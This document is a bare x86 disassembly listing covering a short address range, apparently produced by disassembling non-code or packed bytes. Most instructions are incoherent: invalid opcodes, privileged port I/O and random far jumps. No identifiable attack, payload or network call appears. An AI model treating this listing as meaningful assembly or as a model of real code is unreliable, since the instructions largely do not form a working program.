  4205c1:	stos   DWORD PTR es:[edi],eax
  4205c2:	addr16 push 0xffffff9a
  4205c5:	mov    eax,0x18229d65
  4205ca:	imul   edx,DWORD PTR [esp+ecx*2-0x6f198b2d],0x50f2d4e9
  4205d5:	inc    ecx
  4205d6:	fdivp  st(6),st
  4205d8:	(bad)  
  4205d9:	cld    
  4205da:	in     eax,0xf6
  4205dc:	fdiv   st(6),st
  4205de:	std    
  4205df:	or     dh,BYTE PTR [edi]
  4205e1:	(bad)  
  4205e2:	adc    eax,0x9abb3e36
  4205e7:	loope  0x4205c4
  4205e9:	pop    esi
  4205ea:	inc    edi
  4205eb:	rol    BYTE PTR [eax],0xd3
  4205ee:	bound  esp,QWORD PTR [ebp-0x5073c850]
  4205f4:	dec    edi
  4205f5:	call   0x389b:0x5bbc70e
  4205fc:	xor    dh,BYTE PTR [ebp+0x509e2a7c]
  420602:	test   eax,0xeaf2e01
  420607:	mov    ?,WORD PTR [ebx]
  420609:	and    DWORD PTR [ecx],ecx
  42060b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42060c:	shr    DWORD PTR [edx+0x1],cl
  42060f:	and    esp,edi
  420611:	out    0x87,eax
  420613:	xor    edi,DWORD PTR [eax+0x2c]
  420616:	cmp    DWORD PTR [esi+edx*2-0xb],0xffffffb7
  42061b:	mov    bh,0x27
  42061d:	jmp    0x462c:0xd2cd425d
  420624:	scas   al,BYTE PTR es:[edi]
  420625:	cmp    al,0xda
  420627:	retf   0xea5
  42062a:	xchg   edi,eax
  42062b:	sub    al,BYTE PTR [ebx-0x1c]
  42062e:	sbb    al,0x3d
  420630:	mov    eax,0x91da4247
  420635:	das    
  420636:	push   edx
  420637:	sub    dh,BYTE PTR [eax]
  420639:	clc    
  42063a:	stos   BYTE PTR es:[edi],al
  42063b:	jb     0x4205c0
  42063d:	add    al,0xe4
  42063f:	pop    edi
  420640:	pop    esi
  420641:	shl    BYTE PTR [eax+0x2a98ac4f],cl
  420647:	cmc    
  420648:	xchg   ebp,eax
  420649:	inc    esi
  42064a:	xor    BYTE PTR [eax],dh
  42064c:	aam    0xf7
  42064e:	rcl    dh,1
  420650:	sub    edi,DWORD PTR [ebp-0x7b]
  420653:	push   ecx
  420654:	popa   
  420655:	mov    BYTE PTR [ecx+0x496e4ee0],cl
  42065b:	adc    BYTE PTR [edi-0x30],cl
  42065e:	cmp    al,0x70
  420660:	mov    eax,ds:0x2571d221
  420665:	repnz mov ebp,0xa3aa147d
  42066b:	mov    al,ds:0xc600fba9
  420670:	mov    edx,0x437d29ff
  420675:	mov    esp,0xa57a5f8c
  42067a:	mov    al,0xa7
  42067c:	fs dec esi
  42067e:	jb     0x4206d0
  420680:	sahf   
  420681:	pop    ebx
  420682:	cmp    ah,0xbf
  420685:	sub    eax,0xe72db6ff
  42068a:	das    
  42068b:	xor    al,0xfe
  42068d:	mov    dl,0x74
  42068f:	and    ch,BYTE PTR ds:0xee15c219
  420695:	jg     0x420706
  420697:	(bad)
  42069b:	push   ds
  42069c:	sbb    eax,0x5488a823
  4206a1:	mov    DWORD PTR [bp+si+0x15a1],0x3d15d722
  4206aa:	dec    esp
  4206ab:	aas    
  4206ac:	in     al,0xe2
  4206ae:	iret   
  4206af:	outs   dx,DWORD PTR ds:[esi]
  4206b0:	push   edx
  4206b1:	mov    ds:0xdcb2188b,al
  4206b6:	fnsave [eax+0x27]
  4206b9:	push   ss
  4206ba:	repnz mov edi,0xd3a341e2
  4206c0:	sti    
  4206c1:	pop    edi
  4206c2:	jmp    0x9d9c:0x6a85
  4206c8:	arpl   WORD PTR [ebx],ax
  4206ca:	int    0xd3
  4206cc:	jne    0x420667
  4206ce:	jl     0x4206e9
  4206d0:	in     al,0x31
  4206d2:	ud2    
  4206d4:	jp     0x4206e7
  4206d6:	les    eax,FWORD PTR [ebx+eax*4]
  4206d9:	fldcw  WORD PTR [eax+0x61]
  4206dc:	xchg   ebp,eax
  4206dd:	sbb    eax,ecx
  4206df:	clc    
  4206e0:	ret    0x1b9f
  4206e3:	xchg   esp,eax
  4206e4:	leave  
  4206e5:	shl    ch,0x14
  4206e8:	add    eax,0x8281f9dc
  4206ed:	cli    
  4206ee:	test   al,0x86
  4206f0:	(bad)  
  4206f1:	es sahf 
  4206f3:	pop    esi
  4206f4:	aam    0xf9
  4206f6:	loop   0x4206eb
  4206f8:	dec    esi
  4206f9:	mov    ebx,ecx
  4206fb:	test   bl,dl
  4206fd:	cs sbb edx,ebp
  420700:	fdivr  QWORD PTR [eax]
  420702:	test   ah,ah
  420704:	repnz sub ch,0xd8
  420708:	popa   
  420709:	mov    eax,ds:0x3f2ee9f1
  42070e:	push   cs
  42070f:	pop    es
  420710:	out    dx,eax
  420711:	std    
  420712:	fsub   DWORD PTR [edx+0x6866c0e6]
  420718:	data16 shr BYTE PTR [edi],cl
  42071b:	sub    al,0x1b
  42071d:	mov    eax,0x6aa0aa20
  420722:	xor    eax,0x3145cc80
  420727:	(bad)  
  420728:	mov    bl,0x52
  42072a:	pop    esp
  42072b:	push   ss
  42072c:	xchg   esi,eax
  42072d:	sbb    ecx,0xbd772495
  420733:	js     0x420718
  420735:	lds    edx,FWORD PTR [esi]
  420737:	lock jmp 0x4206f2
  42073a:	jbe    0x42072b
  42073c:	inc    eax
  42073d:	(bad)  
  42073e:	xlat   BYTE PTR ds:[ebx]
  42073f:	mov    edi,DWORD PTR [edx+ebp*2+0x1f]
  420743:	ss jp  0x4207a9
  420746:	push   es
  420747:	pop    es
  420748:	cmp    edi,DWORD PTR [eax-0x60]
  42074b:	or     ebp,DWORD PTR [ecx+0x15]
  42074e:	aaa    
  42074f:	maskmovq mm7,(bad)
  420750:	idiv   DWORD PTR [esi-0x3f]
  420753:	push   cs
  420754:	and    eax,0xe8bc256a
  420759:	sub    cl,bh
  42075b:	xchg   esp,eax
  42075c:	je     0x420784
  42075e:	adc    eax,DWORD PTR [edi]
  420760:	push   ebx
  420761:	xchg   esi,eax
  420762:	ins    BYTE PTR es:[edi],dx
  420763:	imul   ecx,DWORD PTR [ecx-0x54a10050],0x15
  42076a:	push   edi
  42076b:	inc    eax
  42076c:	inc    ebp
  42076d:	push   ds
  42076e:	jmp    0x9615:0xcc7c5460
  420775:	push   ebx
  420776:	jmp    0x420739
  420778:	mov    ds:0xfc7ebe0d,eax
  42077d:	pop    eax
  42077e:	loopne 0x420759
  420780:	loopne 0x42077c
  420782:	jnp    0x420752
  420784:	fld    QWORD PTR [ebx-0x4806209b]
  42078a:	mul    BYTE PTR [edi-0x78]
  42078d:	ret    0x972
  420790:	mov    al,ds:0x5b5d2aef
  420795:	jns    0x420722
  420797:	in     al,dx
  420798:	jg     0x420759
  42079a:	fiadd  WORD PTR [ecx+0x3545dffe]
  4207a0:	add    DWORD PTR [ecx-0x1f7bcbac],edx
  4207a6:	das    
  4207a7:	repnz inc ebp
  4207a9:	cld    
  4207aa:	int    0x63
  4207ac:	call   0xa670:0xa1b84775
  4207b3:	cmp    BYTE PTR [esi+0x4e],ch
  4207b6:	ret    
  4207b7:	loop   0x4207e3
  4207b9:	dec    esp
  4207ba:	sub    dh,BYTE PTR [edx+esi*4-0x4d]
  4207be:	lea    ebp,[eax]
  4207c0:	inc    esp
  4207c1:	cdq    
  4207c2:	outs   dx,BYTE PTR ds:[si]
  4207c4:	push   edx
  4207c5:	push   esp
  4207c6:	mov    esi,0x2b774e94
  4207cb:	inc    ecx
  4207cc:	(bad)  
  4207cd:	xor    BYTE PTR [eax],bl
  4207cf:	out    0x2,eax
  4207d1:	out    0xa1,al
  4207d3:	push   ebp
  4207d4:	sbb    ch,BYTE PTR [edi-0x7e883f1d]
  4207da:	fbld   TBYTE PTR [eax+0x34276c0e]
  4207e0:	pusha  
  4207e1:	in     eax,dx
  4207e2:	and    eax,DWORD PTR [ebp+0x3d]
  4207e5:	inc    edx
  4207e6:	sbb    dl,BYTE PTR [edi+0x6515c90d]
  4207ec:	jecxz  0x4207b6
  4207ee:	mov    edi,0xc5eeedd5
  4207f3:	es pop eax
  4207f5:	bound  ecx,QWORD PTR [esi]
  4207f7:	mov    esi,0xfd8c6f7e
  4207fc:	dec    ebp
  4207fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207fe:	inc    edx
  4207ff:	out    dx,al
  420800:	pop    esp
  420801:	jnp    0x420848
  420803:	and    al,0xf6
  420805:	xor    eax,0x1f2e23ce
  42080a:	xchg   ebx,eax
  42080b:	jge    0x4207c1
  42080d:	lods   al,BYTE PTR ds:[esi]
  42080e:	pop    eax
  42080f:	cmp    al,0xc5
  420811:	xorps  xmm0,XMMWORD PTR [eax]
  420814:	(bad)  
  420815:	jecxz  0x4207cb
  420817:	sub    al,0x13
  420819:	sbb    esi,DWORD PTR [ecx+0x649304a0]
  42081f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420820:	ja     0x4207fa
  420822:	dec    eax
  420823:	and    al,0x33
  420825:	sbb    dh,0xb4
  420828:	(bad)
  42082c:	mov    cl,0x61
  42082e:	mov    WORD PTR [esi+0x5e],ds
  420831:	add    bh,BYTE PTR [eax-0x6a]
  420834:	sub    edi,DWORD PTR [edi]
  420836:	mov    DWORD PTR [esi+0x3d944c13],0xd7571bb3
  420840:	pop    ss
  420841:	or     BYTE PTR [edi+0x6c],ah
  420844:	pop    ebp
  420845:	inc    ebx
  420846:	push   esi
  420847:	jno    0x42083e
  420849:	jmp    0x420813
  42084b:	cmp    eax,0x12208bc0
  420850:	cs and ah,bh
  420853:	hlt    
  420854:	lea    ebp,[eax+ecx*1]
  420857:	loop   0x42080b
  420859:	imul   ebx,DWORD PTR [ebp-0x36],0xffffff82
  42085d:	(bad)  
  42085e:	shl    BYTE PTR [edi],1
  420860:	cdq    
  420861:	push   cs
  420862:	je     0x4208bb
  420864:	(bad)  
  420865:	mov    ecx,0x1e56e96c
  42086a:	je     0x420855
  42086c:	mov    cl,0xe7
  42086e:	push   ds
  42086f:	mov    bl,al
  420871:	bound  esp,QWORD PTR ds:0xeef0e152
  420877:	sahf   
  420878:	pusha  
  420879:	xchg   esp,eax
  42087a:	retf   
  42087b:	and    al,0xda
  42087d:	push   esi
  42087e:	jge    0x420845
  420880:	inc    ecx
  420881:	mov    ah,0x5d
  420883:	popa   
  420884:	pop    esp
  420885:	and    eax,DWORD PTR [edx]
  420887:	out    0x57,al
  420889:	push   cs
  42088a:	test   al,0xd3
  42088c:	jns    0x4208c3
  42088e:	sub    ch,BYTE PTR [ecx+0x2d0ecfd6]
  420894:	mov    bh,0xe5
  420896:	adc    al,0x58
  420898:	test   eax,0xebeadadc
  42089d:	xchg   esi,eax
  42089e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42089f:	sub    BYTE PTR [esi-0x7d],bh
  4208a2:	retf   0x17da
  4208a5:	jnp    0x420872
  4208a7:	add    dh,cl
  4208a9:	outs   dx,DWORD PTR ds:[esi]
  4208aa:	nop
  4208ab:	das    
  4208ac:	sbb    edx,DWORD PTR [edi+edx*2-0x6811dddc]
  4208b3:	retf   0x617e
  4208b6:	mov    ebp,0x8c111220
  4208bb:	inc    esp
  4208bc:	jb     0x4208b0
  4208be:	arpl   ax,si
  4208c0:	xor    eax,0x91f865ae
  4208c5:	(bad)  
  4208c7:	mov    dl,0xa2
  4208c9:	pop    esp
  4208ca:	fistp  WORD PTR [ecx-0x4c70dedd]
  4208d0:	mov    ?,WORD PTR [ebx]
  4208d2:	cmp    BYTE PTR [ebx+0x4c1ead3f],dh
  4208d8:	pop    esp
  4208d9:	ins    BYTE PTR es:[edi],dx
  4208da:	js     0x42085c
  4208dc:	test   eax,0x80b240fa
  4208e1:	mov    eax,0xfbc74f10
  4208e6:	aaa    
  4208e7:	pop    esp
  4208e8:	lea    ecx,[eax-0x4435b0a1]
  4208ee:	(bad)  
  4208ef:	sub    eax,0xe777bc31
  4208f4:	xor    esi,ebp
  4208f6:	cmp    ebx,DWORD PTR [edi]
  4208f8:	lock mov ebp,0x4b2dc7a9
  4208fe:	shr    DWORD PTR [ecx-0x626870b5],1
  420904:	xchg   BYTE PTR [ebp-0x592191e7],al
  42090a:	lods   al,BYTE PTR ds:[esi]
  42090b:	pop    ecx
  42090c:	into   
  42090d:	ins    DWORD PTR es:[edi],dx
  42090e:	jne    0x420908
  420910:	neg    BYTE PTR ds:0x4a2d5c78
  420916:	push   edi
  420917:	(bad)  
  420919:	or     ecx,DWORD PTR [edx]
  42091b:	jo     0x420909
  42091d:	dec    edi
  42091e:	jno    0x42090b
  420920:	lock ret 
  420922:	mov    esi,0xce2f74e5
  420927:	sbb    bl,ch
  420929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42092a:	pop    edx
  42092b:	add    al,0x38
  42092d:	push   es
  42092e:	fsubr  QWORD PTR [edx+0x0]
  420931:	dec    eax
  420932:	arpl   WORD PTR cs:[edx+ebx*4],sp
  420936:	loop   0x420978
  420938:	je     0x4208bb
  42093a:	(bad)  
  42093b:	jo     0x420957
  42093d:	(bad)  
  42093f:	aad    0xd4
  420941:	loope  0x4209b0
  420943:	fldcw  WORD PTR [ecx+0x640aac48]
  420949:	jge    0x4208cc
  42094b:	add    BYTE PTR [ecx+0x65f3cab8],0xd5
  420952:	in     al,dx
  420953:	push   es
  420954:	sahf   
  420955:	popa   
  420956:	push   0xffffff94
  420958:	dec    esi
  420959:	aas    
  42095a:	xchg   BYTE PTR [edi-0x5086d65d],al
  420960:	fdivr  QWORD PTR [edx+ebp*1+0x12362aa1]
  420967:	cmp    DWORD PTR [ebp-0x5c],eax
  42096a:	inc    ebx
  42096b:	test   eax,0x196e2287
  420970:	mov    eax,0x98e6c5e
  420975:	cmp    BYTE PTR [eax],bh
  420977:	out    0x2a,eax
  420979:	or     DWORD PTR [edi-0x4975814c],edx
  42097f:	(bad)  
  420980:	fmul   DWORD PTR [ecx-0x26]
  420983:	adc    ebp,esp
  420985:	and    al,0x8c
  420987:	ror    DWORD PTR [ecx-0x6b5904ef],cl
  42098d:	inc    esp
  42098e:	ins    BYTE PTR es:[edi],dx
  42098f:	mov    BYTE PTR [esi+eax*2+0x49cd8a1f],bh
  420996:	dec    edx
  420997:	adc    al,0x98
  420999:	(bad)  
  42099a:	or     eax,0xf26ae054
  42099f:	xor    eax,0xbc8ce2c1
  4209a4:	cmp    BYTE PTR [esi-0x68],al
  4209a7:	(bad)  
  4209a8:	lock icebp 
  4209aa:	retf   
  4209ab:	ja     0x4209c4
  4209ad:	loopne 0x420998
  4209af:	fwait
  4209b0:	add    dl,0xfd
  4209b3:	in     eax,dx
  4209b4:	jl     0x4209d8
  4209b6:	sbb    BYTE PTR [ecx+edi*8],ah
  4209b9:	cdq    
  4209ba:	add    edi,ecx
  4209bc:	add    edx,ecx
  4209be:	imul   edx,edi
  4209c1:	mov    edi,DWORD PTR [ebp-0x8]
  4209c4:	mov    ebx,DWORD PTR [ebp-0x10]
  4209c7:	sub    ebx,edi
  4209c9:	jmp    0x420edb
  4209ce:	cmp    al,0x3c
  4209d0:	xlat   BYTE PTR ds:[ebx]
  4209d1:	enter  0xdbd7,0xcb
  4209d5:	int3   
  4209d6:	sub    DWORD PTR ds:0xd1f91db4,edx
  4209dc:	and    edi,edi
  4209de:	adc    BYTE PTR [edi+edi*2+0x78],bl
  4209e2:	jae    0x420a60
  4209e4:	js     0x420a5e
  4209e6:	dec    esi
  4209e7:	xchg   ebp,eax
  4209e8:	aam    0x2d
  4209ea:	add    al,0xce
  4209ec:	sbb    WORD PTR [edx-0x2e],si
  4209f0:	and    dl,BYTE PTR [eax-0x7f212cc3]
  4209f6:	mov    ebp,DWORD PTR [ebp+0x6a]
  4209f9:	adc    ch,0x47
  4209fc:	jb     0x4209fa
  4209fe:	mov    edi,0xf6c6ad05
  420a03:	jo     0x420a0b
  420a05:	and    DWORD PTR [ebx+0x34],ebx
  420a08:	sbb    ebx,DWORD PTR [esi]
  420a0a:	pop    ds
  420a0b:	enter  0xe450,0xa3
  420a0f:	xchg   ebp,eax
  420a10:	sbb    al,0xa5
  420a12:	and    esp,eax
  420a14:	sbb    DWORD PTR [ebx+0x1b21f4f4],ecx
  420a1a:	jnp    0x420a35
  420a1c:	add    BYTE PTR [edi-0x53130028],0x44
  420a23:	jp     0x420a55
  420a25:	outs   dx,BYTE PTR ds:[esi]
  420a26:	xchg   BYTE PTR [eax+0x77],dh
  420a29:	aas    
  420a2a:	add    ebx,esi
  420a2c:	idiv   DWORD PTR [ebp+0x572175c1]
  420a32:	cwde   
  420a33:	mov    bh,0x79
  420a35:	addr16 mov ebp,cs
  420a38:	call   0xb7d6:0x6da284fa
  420a3f:	dec    esp
  420a40:	xchg   ebp,eax
  420a41:	pop    ebx
  420a42:	daa    
  420a43:	lahf   
  420a44:	inc    edi
  420a45:	fdiv   QWORD PTR [ebp+0x6e]
  420a48:	rcl    DWORD PTR [ecx],cl
  420a4a:	xchg   esp,eax
  420a4b:	push   es
  420a4c:	inc    ecx
  420a4d:	sub    al,0x9
  420a4f:	push   eax
  420a50:	repz cs pop es
  420a53:	or     cl,BYTE PTR [edx]
  420a55:	dec    esp
  420a56:	push   ebx
  420a57:	mov    ebx,0x7e740fc3
  420a5c:	inc    ebp
  420a5d:	jge    0x420abc
  420a5f:	sbb    ch,BYTE PTR [edi+0x4ee68e4e]
  420a65:	outs   dx,DWORD PTR ds:[esi]
  420a66:	push   ds
  420a67:	js     0x420ab8
  420a69:	dec    edi
  420a6a:	push   0xe2961848
  420a6f:	jmp    0x764345e8
  420a74:	mov    ebp,0xf0d5a5ed
  420a79:	pushf  
  420a7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a7b:	cmp    ah,BYTE PTR [esp+edi*8]
  420a7e:	pop    ds
  420a7f:	idiv   BYTE PTR [edi-0x5d]
  420a82:	jnp    0x420a0c
  420a84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a85:	(bad)  
  420a87:	(bad)  
  420a88:	fnstenv [edi+edi*2-0x77b887d1]
  420a8f:	xlat   BYTE PTR ds:[ebx]
  420a90:	fcmovnb st,st(1)
  420a92:	loope  0x420af4
  420a94:	or     al,0x1a
  420a96:	xlat   BYTE PTR ds:[ebx]
  420a97:	je     0x420a30
  420a99:	scas   eax,DWORD PTR es:[edi]
  420a9a:	repnz push ss
  420a9c:	or     al,0x1b
  420a9e:	mov    dh,0x44
  420aa0:	js     0x420b0c
  420aa2:	or     al,0x2
  420aa4:	cmp    eax,0x2d7349
  420aa9:	adc    al,0xe5
  420aab:	jo     0x420b13
  420aad:	push   0x7a7963b6
  420ab2:	icebp  
  420ab3:	sbb    eax,ebp
  420ab5:	test   al,0xe2
  420ab7:	cmp    al,0xce
  420ab9:	jl     0x420a5a
  420abb:	pusha  
  420abc:	or     DWORD PTR [edi-0x71d548c9],esi
  420ac2:	fdivr  QWORD PTR [edx]
  420ac4:	push   es
  420ac5:	js     0x420a49
  420ac7:	retf   
  420ac8:	xor    eax,0x7509f75c
  420acd:	push   eax
  420ace:	psrlw  mm2,QWORD PTR [esi+0x1cc818b0]
  420ad5:	pop    ecx
  420ad6:	pop    ss
  420ad7:	test   al,0x2c
  420ad9:	add    BYTE PTR [edi],0x9e
  420adc:	jle    0x420b24
  420ade:	in     al,dx
  420adf:	jo     0x420ae5
  420ae1:	ss add al,0xbf
  420ae4:	mov    al,0xe
  420ae6:	cld    
  420ae7:	jecxz  0x420b2b
  420ae9:	std    
  420aea:	pop    esp
  420aeb:	sub    DWORD PTR [ebp-0x5ddc2ea7],edx
  420af1:	pop    ss
  420af2:	mov    bh,0xa2
  420af4:	ja     0x420a78
  420af6:	test   DWORD PTR [ebx],0x2475b771
  420afc:	jbe    0x420b4b
  420afe:	mov    al,ds:0xf68dd7e5
  420b03:	sub    edi,DWORD PTR es:[ebp-0x7a]
  420b07:	rcl    BYTE PTR [ebx-0x6544d52d],0x11
  420b0e:	or     ecx,DWORD PTR [edx-0x6a2240d2]
  420b14:	adc    eax,0x9d9e7bcb
  420b19:	jp     0x420b4f
  420b1b:	pop    ebp
  420b1c:	sbb    esi,DWORD PTR [ecx+0x72]
  420b1f:	aas    
  420b20:	fstp   st(7)
  420b22:	bound  esi,QWORD PTR [ecx-0x3e2bad26]
  420b28:	sub    al,0x5c
  420b2a:	xor    al,0x7a
  420b2c:	xchg   esp,eax
  420b2d:	stos   BYTE PTR es:[edi],al
  420b2e:	jno    0x420b61
  420b30:	int3   
  420b31:	loopne 0x420b98
  420b33:	shl    ebp,0x4a
  420b36:	sub    eax,0xf9eaadde
  420b3b:	pop    esp
  420b3c:	ins    DWORD PTR es:[edi],dx
  420b3d:	neg    edx
  420b3f:	sar    DWORD PTR [eax],cl
  420b41:	stos   DWORD PTR es:[edi],eax
  420b42:	xchg   esp,eax
  420b43:	cmp    BYTE PTR [eax],dl
  420b45:	sbb    al,0x74
  420b47:	inc    ebp
  420b48:	outs   dx,DWORD PTR ds:[esi]
  420b49:	jge    0x420b10
  420b4b:	jle    0x420bb0
  420b4d:	xchg   ch,ah
  420b4f:	ins    BYTE PTR es:[edi],dx
  420b50:	(bad)  
  420b51:	fdivr  QWORD PTR [esi]
  420b53:	je     0x420b69
  420b55:	call   0x50f03481
  420b5a:	fisub  DWORD PTR [edi+0xc]
  420b5d:	and    cl,BYTE PTR [edi]
  420b5f:	mov    eax,ds:0x1027248e
  420b64:	aam    0x18
  420b66:	dec    ebx
  420b67:	stos   BYTE PTR es:[edi],al
  420b68:	iret   
  420b69:	repz xchg ch,dh
  420b6c:	dec    edx
  420b6d:	mov    bh,0x1d
  420b6f:	into   
  420b70:	sub    eax,0x583b3aa2
  420b75:	imul   ecx,DWORD PTR [esi],0xb0866ba
  420b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b7c:	jb     0x420b37
  420b7e:	cmp    al,0x14
  420b80:	(bad)  
  420b81:	xchg   ebx,eax
  420b82:	mov    WORD PTR [eax+0x745fd65f],?
  420b88:	rcr    BYTE PTR [edi],cl
  420b8a:	aad    0xa7
  420b8c:	mov    ds:0x5e8ec305,al
  420b91:	lea    edx,[eax]
  420b93:	pop    ss
  420b94:	pop    edi
  420b95:	adc    eax,0x355365b8
  420b9a:	mov    ah,0x5f
  420b9c:	jno    0x420c1d
  420b9e:	inc    edi
  420b9f:	repz xor DWORD PTR [ecx-0x38ed5577],eax
  420ba6:	es push edi
  420ba8:	mov    edi,0xbdc14fd7
  420bad:	xor    DWORD PTR [edi+0x2696dabe],esi
  420bb3:	fcmovnbe st,st(6)
  420bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bb6:	addr16 out 0x3a,eax
  420bb9:	jns    0x420c33
  420bbb:	adc    cl,BYTE PTR [ecx-0x2cf68300]
  420bc1:	mov    ds:0x10db37e9,al
  420bc6:	jle    0x420c1a
  420bc8:	xchg   esp,eax
  420bc9:	mov    al,ds:0x7fd896a1
  420bce:	scas   al,BYTE PTR es:[edi]
  420bcf:	pop    ecx
  420bd0:	xchg   ebp,eax
  420bd1:	mov    ch,0x7a
  420bd3:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  420bd5:	jmp    0x6c38:0x1a645944
  420bdc:	jae    0x420bc9
  420bde:	inc    ebp
  420bdf:	mov    eax,0x1602e14b
  420be4:	mov    cl,0xba
  420be6:	sub    BYTE PTR [edi-0x42c6a208],dl
  420bec:	mov    al,0x72
  420bee:	rcl    BYTE PTR [eax+0x40],cl
  420bf1:	(bad)  
  420bf2:	rol    BYTE PTR [ebp+0x1f],cl
  420bf5:	push   0x9e01fc5a
  420bfa:	jb     0x420c4c
  420bfc:	jmp    0x420c2e
  420bfe:	lahf   
  420bff:	xchg   ebp,eax
  420c00:	push   cs
  420c01:	fild   WORD PTR [edx+0x29]
  420c04:	or     eax,0x2cb98ec6
  420c09:	push   ss
  420c0a:	mov    ebp,0x6f3b1262
  420c0f:	xchg   ebp,eax
  420c11:	mov    dl,0xd9
  420c13:	xchg   esp,eax
  420c14:	cmp    bl,BYTE PTR [ecx+0x7530ebef]
  420c1a:	add    ebp,ebx
  420c1c:	jl     0x420be9
  420c1e:	fld    st(3)
  420c20:	pop    edx
  420c21:	xchg   esp,eax
  420c22:	mov    al,0x46
  420c24:	(bad)  
  420c25:	cmp    DWORD PTR [edi+0x78],ecx
  420c28:	pushf  
  420c29:	outs   dx,DWORD PTR ds:[esi]
  420c2a:	and    eax,0xd24ed27e
  420c2f:	or     BYTE PTR [esi],ah
  420c31:	mov    ecx,0xf6d23ea1
  420c36:	pop    ebx
  420c37:	cwde   
  420c38:	or     eax,0xaf8cb40c
  420c3d:	test   dh,bh
  420c3f:	jecxz  0x420bf9
  420c41:	imul   edx,DWORD PTR [edi+0x6d1dabd1],0xffffffd4
  420c48:	in     al,dx
  420c49:	sbb    BYTE PTR [ebx],bh
  420c4b:	push   eax
  420c4c:	(bad)
  420c4f:	push   0xffffff9a
  420c51:	inc    ecx
  420c52:	dec    edx
  420c53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c54:	push   cs
  420c55:	pop    ds
  420c56:	retf   
  420c57:	lock ds cmp eax,0xd7d5a36d
  420c5e:	jbe    0x420c3d
  420c60:	lock das 
  420c62:	mov    al,ds:0xc0fa364c
  420c67:	jge    0x420c00
  420c69:	sbb    esp,DWORD PTR [eax+0x5010a19a]
  420c6f:	out    dx,eax
  420c70:	cvtdq2ps xmm3,xmm0
  420c73:	mov    edi,0xce92ce58
  420c78:	je     0x420c87
  420c7a:	sti    
  420c7b:	leave  
  420c7c:	out    dx,al
  420c7d:	jae    0x420c69
  420c7f:	fwait
  420c80:	inc    ecx
  420c81:	dec    esi
  420c82:	into   
  420c83:	scas   al,BYTE PTR es:[edi]
  420c84:	mov    bh,0xbc
  420c86:	adc    eax,0x35364bd5
  420c8b:	xlat   BYTE PTR ds:[ebx]
  420c8c:	dec    eax
  420c8d:	aas    
  420c8e:	out    0x0,eax
  420c90:	icebp  
  420c91:	fcmovb st,st(3)
  420c93:	adc    ch,ch
  420c95:	data16 mov ch,0xb7
  420c98:	fiadd  DWORD PTR [ebx-0x3f]
  420c9b:	xor    esp,ecx
  420c9d:	add    DWORD PTR [ebp-0x4f],ecx
  420ca0:	cmp    eax,0xfec52a3e
  420ca5:	cdq    
  420ca6:	jno    0x420c77
  420ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ca9:	and    esp,edx
  420cab:	sbb    DWORD PTR [ebp-0x79],esi
  420cae:	loope  0x420c78
  420cb0:	adc    BYTE PTR [esp+edi*4-0x53646389],cl
  420cb7:	xchg   BYTE PTR ds:0x174342e1,ah
  420cbd:	pop    esi
  420cbe:	repnz push es
  420cc0:	mov    cl,0x0
  420cc2:	je     0x420d28
  420cc4:	mov    edx,0xbd84bf7c
  420cc9:	fild   QWORD PTR [edx]
  420ccb:	cmp    dl,dh
  420ccd:	mov    ebp,0x41915a74
  420cd2:	jae    0x420d0e
  420cd4:	popf   
  420cd5:	ins    DWORD PTR es:[edi],dx
  420cd6:	(bad)  
  420cd7:	into   
  420cd8:	sbb    bh,BYTE PTR [eax+0x7ed84f97]
  420cde:	or     BYTE PTR [esi-0x2c],ah
  420ce1:	mov    ecx,0x71ff0c6f
  420ce6:	and    ebx,0x6aa833b9
  420cec:	xchg   dh,cl
  420cee:	mov    ebx,DWORD PTR [esi-0x1ab74e2a]
  420cf4:	push   ss
  420cf5:	dec    edx
  420cf6:	push   ecx
  420cf7:	dec    ecx
  420cf8:	fcomp  DWORD PTR [edi-0x55]
  420cfb:	fwait
  420cfc:	(bad)  
  420cfd:	cmp    BYTE PTR [ecx-0x7c],dl
  420d00:	cld    
  420d01:	addr16 push eax
  420d03:	out    0x3b,eax
  420d05:	ret    
  420d06:	mov    eax,0x2c5df9da
  420d0b:	xchg   esp,eax
  420d0c:	(bad)  
  420d0d:	aad    0x40
  420d0f:	add    al,0x1c
  420d11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d12:	addr16 jmp 0x7ae6:0xdbe85575
  420d1a:	mov    edx,0xcb4bbe65
  420d1f:	add    DWORD PTR [esi],eax
  420d21:	push   edx
  420d22:	loopne 0x420d3b
  420d24:	mov    bl,0x7a
  420d26:	pushf  
  420d27:	dec    ecx
  420d28:	les    ebx,FWORD PTR [ebp-0x4b]
  420d2b:	push   eax
  420d2c:	daa    
  420d2d:	iret   
  420d2e:	mov    DWORD PTR [ebp-0x1b119263],eax
  420d34:	jb     0x420d0f
  420d36:	mov    edi,0x1b72dca2
  420d3b:	mov    cl,0x25
  420d3d:	call   0x285116f9
  420d42:	pop    esp
  420d43:	push   ecx
  420d44:	mov    eax,ds:0xf4040a83
  420d49:	xlat   BYTE PTR ds:[ebx]
  420d4a:	or     al,al
  420d4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d4d:	clc    
  420d4e:	dec    ebp
  420d4f:	hlt    
  420d50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d51:	mov    esp,0x5d436693
  420d56:	(bad)  
  420d57:	push   edi
  420d58:	scas   eax,DWORD PTR es:[edi]
  420d59:	ficom  WORD PTR [ebx+0x34]
  420d5c:	(bad)  
  420d5d:	daa    
  420d5e:	inc    cl
  420d60:	push   ds
  420d61:	(bad)  
  420d62:	dec    esp
  420d63:	leave  
  420d64:	stc    
  420d65:	gs cdq 
  420d67:	and    edx,0xffffffb4
  420d6a:	pop    eax
  420d6b:	mov    DWORD PTR [ecx],ecx
  420d6d:	gs xchg eax,eax
  420d70:	pusha  
  420d71:	fadd   QWORD PTR [eax-0x503b4261]
  420d77:	sti    
